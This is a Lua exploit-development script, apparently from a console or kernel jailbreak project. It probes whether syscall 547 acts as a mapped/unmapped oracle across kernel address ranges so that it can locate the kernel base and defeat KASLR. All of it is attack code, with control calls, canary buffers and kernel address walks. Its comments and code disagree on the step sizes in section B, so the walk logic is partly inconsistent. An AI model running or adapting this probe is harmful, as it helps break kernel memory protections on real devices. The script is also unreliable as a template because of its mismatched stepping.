-- CRASH_CLASS: MODERATE
-- PROBE 237a: is 547 query_memory_protection a mapped/unmapped oracle
--
-- Context: 547 accepts a user address and writes a 24-byte record, so its
-- answer is at least address-dependent. 198a tried exactly one kernel address
-- (0xFFFF8000_00000000), got -1 and no write, and stopped there - one address
-- cannot tell "kernel addresses are rejected" from "that address is unmapped",
-- and the kernel map is not at the bottom of the canonical range because KASLR
-- moves it.
--
-- If 547 answers -1 for an unmapped address and 0 for a mapped one, then a walk
-- over the kernel range finds the base, which is the KASLR defeat this project
-- does not have. If it refuses kernel addresses outright, every answer is -1
-- and the question is closed for good.
--
--   A  control: a mapped page we own, then an address we deliberately unmapped,
--      then a user address that was never mapped - the two -1 cases must agree
--   B  kernel range walk at 1 GiB steps across the canonical base, 16 probes
--   C  4 GiB steps across the upper half of the canonical range
--
-- Every answer is printed before the next call so a fault leaves the record.

print("=== PROBE 237a: 547 as a mapped/unmapped oracle ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

local sc_getpid = make_syscall(20)
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(73)
local sc_query = make_syscall(547)

local dead = false
local function pid()
    local ok, v = pcall(function() return sc_getpid():tonumber() end)
    if ok then return v end
    dead = true
    return nil
end
print("[0] canary pid=" .. tostring(pid()))

local OUT = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local PAGE = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
zero(OUT, 0x100)

local function canary()
    for off = 0, 0x100, 4 do wd(OUT + off, 0xA5A5A5A5) end
end

local function show(label, addr)
    canary()
    local ok, r = pcall(function() return sc_query(addr, uint64(OUT)) end)
    if not ok then
        print(string.format("    %-34s killed", label))
        dead = true
        return nil
    end
    local rv = to_num(r)
    local rec = {}
    for i = 0, 5 do rec[#rec + 1] = q(rd(OUT + i * 4)) end
    print(string.format("    %-34s ret=%d  [%s]", label, rv, table.concat(rec, " ")))
    return rv
end

print("")
print("[A] controls")
show("mapped page", PAGE)
local ok_un, r_un = pcall(function() return sc_munmap(uint64(PAGE), uint64(0x4000)) end)
print("    munmap(page) -> " .. (ok_un and tostring(to_num(r_un)) or "killed"))
show("the page just unmapped", PAGE)
show("never-mapped user address 0x100000", uint64(0x100000))

print("")
print("[B] walk 0xFFFFFFFF80000000 upward in 128 MiB steps")
for k = 0, 15 do
    if dead then break end
    local hi = 0xFFFFFFFF - math.floor(k / 4)
    local lo = (0x80000000 + (k % 4) * 0x08000000) % 0x100000000
    show(string.format("t %2d 0x%08X%08X", k, hi, lo), uint64(string.format("0x%08X%08X", hi, lo)))
end

print("")
print("[C] walk 0xFFFF800000000000 in 4 GiB steps")
for k = 0, 15 do
    if dead then break end
    show(string.format("h %2d 0x%08X00000000", k, 0xFFFF8000 + k),
        uint64(string.format("0x%08X00000000", 0xFFFF8000 + k)))
end

print("    pid -> " .. tostring(pid()))
print("")
print("=== PROBE 237a COMPLETE ===")
